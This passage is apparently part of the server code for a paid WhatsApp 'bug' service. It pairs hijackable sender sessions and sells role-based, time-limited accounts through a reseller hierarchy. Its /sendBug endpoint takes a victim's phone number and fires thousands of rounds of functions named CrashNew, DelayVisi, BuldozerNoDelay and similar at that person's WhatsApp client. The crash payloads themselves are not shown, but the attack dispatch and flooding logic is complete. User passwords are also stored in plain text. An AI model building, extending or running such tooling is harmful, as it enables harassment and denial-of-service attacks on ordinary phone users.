    return { lastUsedAt: 0, lastUsedBy: null };
  }
}

function writeGlobalSenderCooldown(lastUsedAt, username) {
  try {
    fs.writeFileSync(
      GLOBAL_SENDER_COOLDOWN_FILE,
      JSON.stringify(
        {
          lastUsedAt,
          lastUsedBy: username || null,
        },
        null,
        2,
      ),
    );
  } catch (err) {
    console.error("❌ Failed to save global sender cooldown:", err.message);
  }
}

function ensurePrivateSenderCooldownState(user) {
  if (!Number.isFinite(user.privateSenderLastUsedAt) || user.privateSenderLastUsedAt < 0) {
    user.privateSenderLastUsedAt = 0;
    return true;
  }

  return false;
}

function getSenderCooldownStatus(user, senderType) {
  const now = Date.now();

  if (senderType === "global") {
    const state = readGlobalSenderCooldown();
    const elapsed = now - state.lastUsedAt;

    if (state.lastUsedAt > 0 && elapsed < GLOBAL_SENDER_COOLDOWN_MS) {
      return {
        active: true,
        wait: Math.ceil((GLOBAL_SENDER_COOLDOWN_MS - elapsed) / 1000),
        scope: "global",
        lastUsedBy: state.lastUsedBy,
      };
    }

    return { active: false, scope: "global", lastUsedBy: state.lastUsedBy };
  }

  const lastUsedAt = Number(user.privateSenderLastUsedAt || 0);
  const elapsed = now - lastUsedAt;

  if (lastUsedAt > 0 && elapsed < PRIVATE_SENDER_COOLDOWN_MS) {
    return {
      active: true,
      wait: Math.ceil((PRIVATE_SENDER_COOLDOWN_MS - elapsed) / 1000),
      scope: "private",
    };
  }

  return { active: false, scope: "private" };
}

function buildSessionCacheKey(folderNameOrPath = "", sessionName = "") {
  const folderName = path.basename(String(folderNameOrPath).replace(/[\\/]+$/, "")) || String(folderNameOrPath);
  return `${folderName}::${sessionName}`;
}

function buildSenderConnectionItem(sender, scope, role) {
  const sessionName = sender?.sessionName?.toString() || sender?.id?.toString() || "Unknown";
  const isGlobal = scope === "global";

  return {
    id: sender?.id?.toString() || sessionName,
    sessionName,
    scope,
    isGlobal,
    canDelete: isGlobal ? canManageGlobalSender(role) : true,
  };
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  const senderType = String(req.query.senderType || "private").trim().toLowerCase() === "global"
    ? "global"
    : "private";
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - Sender: ${senderType}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  let shouldSaveDatabase = ensureGlobalSenderUsageState(user);
  let globalSenderQuota = getGlobalSenderQuotaPayload(user);
  let selectedSession = null;

  if (senderType === "global") {
    if (!globalSenderQuota.canUse) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderDeniedMessage(user.role || "member"),
        globalSenderQuota,
      });
    }

    if (!globalSenderQuota.unlimited && globalSenderQuota.used >= globalSenderQuota.limit) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderLimitMessage(user.role || "member", globalSenderQuota),
        globalSenderQuota,
      });
    }

    selectedSession = checkActiveSessionInFolder(GLOBAL_SENDER_FOLDER);
    if (!selectedSession) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada Global Sender aktif saat ini.",
        globalSenderQuota,
      });
    }
  } else {
    selectedSession = checkActiveSessionInFolder(user.username);
    if (!selectedSession) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada sender pribadi aktif pada akun ini.",
        globalSenderQuota,
      });
    }
  }

  const role = user.role || "member";
  shouldSaveDatabase = ensurePrivateSenderCooldownState(user) || shouldSaveDatabase;

  const cooldownStatus = getSenderCooldownStatus(user, senderType);
  if (cooldownStatus.active) {
    if (shouldSaveDatabase) {
      saveDatabase(db);
    }

    const cooldownMessage = senderType === "global"
      ? `Global sender sedang jeda. Coba lagi dalam ${cooldownStatus.wait} detik.${cooldownStatus.lastUsedBy ? ` Terakhir dipakai oleh ${cooldownStatus.lastUsedBy}.` : ""}`
      : `Sender pribadi kamu sedang jeda. Coba lagi dalam ${cooldownStatus.wait} detik.`;

    console.log(`${user.username} Still Cooldown (${senderType})`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownStatus.wait,
      senderType,
      role,
      message: cooldownMessage,
      cooldownScope: cooldownStatus.scope,
      lastUsedBy: cooldownStatus.lastUsedBy || null,
      globalSenderQuota,
    });
  }

  if (senderType === "global") {
    const quotaResult = consumeGlobalSenderQuota(user);
    globalSenderQuota = quotaResult.quota;

    if (!quotaResult.ok) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: quotaResult.message,
        globalSenderQuota,
      });
    }

    shouldSaveDatabase = shouldSaveDatabase || quotaResult.changed;
  }

  // ============ Respon Duluan ============ //
  const now = Date.now();
  if (senderType === "global") {
    writeGlobalSenderCooldown(now, user.username);
  } else {
    user.privateSenderLastUsedAt = now;
  }
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown (${senderType})`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType,
    senderSession: selectedSession.sessionName,
    globalSenderQuota,
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const activeFolder = senderType === "global" ? GLOBAL_SENDER_FOLDER : user.username;
    const attemptSend = async (session, retry = false) => {
      try {
        const sock = session?.sock;
        if (!sock) {
          throw new Error("Sender session not available");
        }

        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "click":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "android":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "invisible":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "ios_invis":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "ios_noinvis":
            for (let i = 0; i < 100; i++) {
              await delaybyzsnz(sock, targetJid);
              await sleep(1000);
            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (session?.cacheKey && err.message === 'Connection Closed') {
          delete activeConnections[session.cacheKey];
          delete biz[session.cacheKey];
          delete mess[session.cacheKey];
        }
        if (!retry) {
          const retrySession = await checkActiveSessionInFolder(activeFolder);
          if (retrySession) return await attemptSend(retrySession, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    if (!selectedSession?.sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(selectedSession);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('zsnz', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    if (activeConnections[cacheKey]) {
      activeCreds.push({
          id: sessionName,
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

function removeSessionArtifacts(folderPath, sessionName) {
  const sessionFolder = path.join(folderPath, sessionName);
  const sessionFile = path.join(folderPath, `${sessionName}.json`);

  if (fs.existsSync(sessionFolder)) {
    fs.rmSync(sessionFolder, { recursive: true, force: true });
  }

  if (fs.existsSync(sessionFile)) {
    fs.rmSync(sessionFile, { force: true });
  }
}

const deletingSessions = new Set();
const pendingQrSessions = new Map();

function ensureSessionFolders(ownerFolder, sessionName) {
  const rootDir = 'zsnz';
  const ownerDir = path.join(rootDir, ownerFolder);
  const sessionDir = path.join(ownerDir, sessionName);

  if (!fs.existsSync(rootDir)) fs.mkdirSync(rootDir);
  if (!fs.existsSync(ownerDir)) fs.mkdirSync(ownerDir);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  return { ownerDir, sessionDir };
}

function setPendingQrState(cacheKey, patch) {
  const current = pendingQrSessions.get(cacheKey) || {};
  pendingQrSessions.set(cacheKey, {
    ...current,
    ...patch,
    updatedAt: Date.now(),
  });
}

function clearPendingQrState(cacheKey) {
  const current = pendingQrSessions.get(cacheKey);
  try {
    current?.socket?.end?.();
  } catch (err) {
    console.log(`[QR] socket end skipped for ${cacheKey}: ${err.message}`);
  }
  pendingQrSessions.delete(cacheKey);
}

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const changed = ensureGlobalSenderUsageState(user);
  const privateConnections = getActiveCredsInFolder(user.username).map(sender =>
    buildSenderConnectionItem(sender, "private", user.role || "member")
  );
  const globalConnections = getActiveCredsInFolder(GLOBAL_SENDER_FOLDER).map(sender =>
    buildSenderConnectionItem(sender, "global", user.role || "member")
  );

  if (changed) {
    saveDatabase(db);
  }

  return res.json({
    valid: true,
    connections: [...globalConnections, ...privateConnections],
    privateConnections,
    globalConnections,
    globalSenderQuota: getGlobalSenderQuotaPayload(user),
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number, global } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "Invalid session key" });

  const cleanNumber = String(number || "").replace(/\D/g, "");
  const isGlobal = String(global || "0").trim() === "1";
  if (!cleanNumber) return res.status(400).json({ error: "Number is required" });

  if (isGlobal && !canManageGlobalSender(user.role || "member")) {
    return res.status(403).json({
      valid: false,
      message: "Hanya owner atau developer yang dapat menambahkan Global Sender.",
    });
  }

  try {
  const ownerFolder = isGlobal ? GLOBAL_SENDER_FOLDER : user.username;
  const cacheKey = buildSessionCacheKey(ownerFolder, cleanNumber);
  const sessionDir = path.join('zsnz', ownerFolder, cleanNumber); 
  
  if (!fs.existsSync('zsnz')) fs.mkdirSync('zsnz');
  if (!fs.existsSync(`zsnz/${ownerFolder}`)) fs.mkdirSync(`zsnz/${ownerFolder}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      if (deletingSessions.has(cacheKey)) {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
        removeSessionArtifacts(path.join('zsnz', ownerFolder), cleanNumber);
        deletingSessions.delete(cacheKey);
        return;
      }

      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${cleanNumber}...`);
        await waiting(3000);
        await pairingWa(cleanNumber, ownerFolder);
      } else {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
      }
    } else if (connection === "open") {
      activeConnections[cacheKey] = sock;

      const sourceCreds = path.join(sessionDir, "creds.json");
      const destCreds = path.join("zsnz", ownerFolder, `${cleanNumber}.json`);
      const type = detectWATypeFromCreds(sourceCreds);

      if (type === "Business") {
        biz[cacheKey] = sock;
      } else if (type === "Messenger") {
        mess[cacheKey] = sock;
      }

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(cleanNumber);
    console.log(code)
    if (code) {
      return res.json({
        valid: true,
        number: cleanNumber,
        pairingCode: code,
        scope: isGlobal ? "global" : "private",
      });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  return res.json({
    valid: false,
    message: "Sender sudah terhubung atau pairing masih diproses.",
  });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/getQrSender", async (req, res) => {
  const { key, number, global } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "User not found" });

  const cleanNumber = String(number || "").replace(/\D/g, "");
  const isGlobal = String(global || "0").trim() === "1";
  if (!cleanNumber) {
    return res.status(400).json({ valid: false, message: "Number is required" });
  }

  if (isGlobal && !canManageGlobalSender(user.role || "member")) {
    return res.status(403).json({
      valid: false,
      message: "Hanya owner atau developer yang dapat menambahkan Global Sender.",
    });
  }

  const ownerFolder = isGlobal ? GLOBAL_SENDER_FOLDER : user.username;
  const cacheKey = buildSessionCacheKey(ownerFolder, cleanNumber);
  const existingPending = pendingQrSessions.get(cacheKey);

  if (existingPending?.status === "qr" && existingPending.qr) {
    return res.json({
      valid: true,
      mode: "qr",
      number: cleanNumber,
      scope: isGlobal ? "global" : "private",
      qr: existingPending.qr,
    });
  }

  if (existingPending?.status === "connected") {
    return res.json({
      valid: false,
      message: "Sender sudah terhubung.",
    });
  }

  try {
    const { sessionDir } = ensureSessionFolders(ownerFolder, cleanNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    setPendingQrState(cacheKey, {
      socket: sock,
      status: "waiting",
      ownerFolder,
      number: cleanNumber,
    });

    sock.ev.on("creds.update", saveCreds);

    const qrPromise = new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error("QR generation timed out"));
      }, 15000);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
          clearTimeout(timeout);
          setPendingQrState(cacheKey, {
            socket: sock,
            status: "qr",
            qr,
          });
          return resolve({
            valid: true,
            mode: "qr",
            number: cleanNumber,
            scope: isGlobal ? "global" : "private",
            qr,
          });
        }

        if (connection === "open") {
          setPendingQrState(cacheKey, {
            socket: sock,
            status: "connected",
          });

          const sourceCreds = path.join(sessionDir, "creds.json");
          const destCreds = path.join("zsnz", ownerFolder, `${cleanNumber}.json`);
          const type = detectWATypeFromCreds(sourceCreds);

          activeConnections[cacheKey] = sock;
          if (type === "Business") {
            biz[cacheKey] = sock;
          } else if (type === "Messenger") {
            mess[cacheKey] = sock;
          }

          try {
            await waiting(3000);
            if (fs.existsSync(sourceCreds)) {
              const data = fs.readFileSync(sourceCreds);
              fs.writeFileSync(destCreds, data);
              console.log(`✅ Rewrote session to ${destCreds}`);
            }
          } catch (e) {
            console.error(`❌ Failed to rewrite creds: ${e.message}`);
          }
        }

        if (connection === "close") {
          clearTimeout(timeout);
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut;
          clearPendingQrState(cacheKey);

          if (!isLoggedOut) {
            return reject(
              new Error(`QR connection closed before scan (${statusCode || "unknown"})`)
            );
          }

          return reject(new Error("QR session logged out"));
        }
      });
    });

    const result = await qrPromise;
    return res.json(result);
  } catch (err) {
    clearPendingQrState(cacheKey);
    return res.status(500).json({
      valid: false,
      message: err.message || "Failed to generate QR sender",
    });
  }
});

app.delete("/deleteSender", async (req, res) => {
  const { key, id, scope } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "User not found" });

  const senderId = String(id || "").trim();
  if (!senderId) {
    return res.status(400).json({ valid: false, message: "Sender id is required" });
  }

  const requestedScope = String(scope || "").trim().toLowerCase();
  const userFolderName = user.username;
  const globalFolderName = GLOBAL_SENDER_FOLDER;

  let resolvedFolderName = userFolderName;
  let resolvedScope = "private";

  if (requestedScope === "global") {
    if (!canManageGlobalSender(user.role || "member")) {
      return res.status(403).json({
        valid: false,
        message: "Hanya owner atau developer yang dapat menghapus Global Sender.",
      });
    }

    resolvedFolderName = globalFolderName;
    resolvedScope = "global";
  } else {
    const privateFile = path.join('zsnz', userFolderName, `${senderId}.json`);
    const privateDir = path.join('zsnz', userFolderName, senderId);
    const globalFile = path.join('zsnz', globalFolderName, `${senderId}.json`);
    const globalDir = path.join('zsnz', globalFolderName, senderId);
    const privateExists = fs.existsSync(privateFile) || fs.existsSync(privateDir);
    const globalExists = fs.existsSync(globalFile) || fs.existsSync(globalDir);

    if (!privateExists && globalExists) {
      if (!canManageGlobalSender(user.role || "member")) {
        return res.status(403).json({
          valid: false,
          message: "Hanya owner atau developer yang dapat menghapus Global Sender.",
        });
      }

      resolvedFolderName = globalFolderName;
      resolvedScope = "global";
    }
  }

  const resolvedFolder = path.join('zsnz', resolvedFolderName);
  const sessionFolder = path.join(resolvedFolder, senderId);
  const sessionFile = path.join(resolvedFolder, `${senderId}.json`);
  const cacheKey = buildSessionCacheKey(resolvedFolderName, senderId);
  const sock = activeConnections[cacheKey] || biz[cacheKey] || mess[cacheKey];

  if (!sock && !fs.existsSync(sessionFolder) && !fs.existsSync(sessionFile)) {
    return res.status(404).json({ valid: false, message: "Sender not found" });
  }

  deletingSessions.add(cacheKey);

  delete activeConnections[cacheKey];
  delete biz[cacheKey];
  delete mess[cacheKey];

  if (sock?.logout) {
    try {
      await sock.logout();
    } catch (err) {
      console.log(`[${senderId}] Logout during delete failed: ${err.message}`);
    }
  }

  removeSessionArtifacts(resolvedFolder, senderId);

  if (!sock) {
    deletingSessions.delete(cacheKey);
  }

  return res.json({
    valid: true,
    deleted: true,
    id: senderId,
    scope: resolvedScope,
  });
});


const normalizeRoleName = (role = "member") =>
  String(role).trim().toLowerCase().replace(/\s+/g, "_");

const ROLE_CREATE_PERMISSIONS = {
  owner: ["owner", "all_access", "developer", "tk", "pt", "moderator", "reseller", "vip", "member"],
  developer: ["owner", "all_access", "developer", "tk", "pt", "moderator", "reseller", "vip", "member"],
  all_access: ["owner", "tk", "pt", "moderator", "reseller", "vip", "member"],
  tk: ["pt", "moderator", "reseller", "vip", "member"],
  moderator: ["pt", "reseller", "vip", "member"],
  pt: ["reseller", "vip", "member"],
  reseller: ["member"],
  vip: ["member"],
  member: [],
};

function getAllowedCreateRoles(role) {
  return ROLE_CREATE_PERMISSIONS[normalizeRoleName(role)] || [];
}

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role = "member" } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}' role '${role}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");
  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin membuat role '${role}'.`);
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (creatorRole === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: requestedRole,
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day} role ${requestedRole}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (owner/developer only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  const adminRole = normalizeRoleName(admin?.role || "member");
  if (!admin || !["owner", "developer"].includes(adminRole)) {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner/developer.`);
    return res.json({ valid: true, authorized: false, message: "Only owner or developer can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
    
    sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
    
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const viewer = db.find(u => u.username === keyInfo.username);
  const viewerRole = normalizeRoleName(viewer?.role || "member");
  const allowedRoles = getAllowedCreateRoles(viewerRole);

  if (!viewer || allowedRoles.length === 0) {
    console.log(`[❌ LIST] ${viewer?.username || "Unknown"} tidak diizinkan melihat user list.`);
    return res.json({
      valid: true,
      authorized: false,
      message: `Role '${viewerRole}' tidak bisa melihat daftar user.`,
    });
  }

  const users = db
    .filter(u => allowedRoles.includes(normalizeRoleName(u.role || "member")))
    .map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: normalizeRoleName(u.role || "member"),
    }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role = "member", day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");
  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: requestedRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );

  const logLine = `${creator.username} Created ${newUser.username} Role ${requestedRole} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

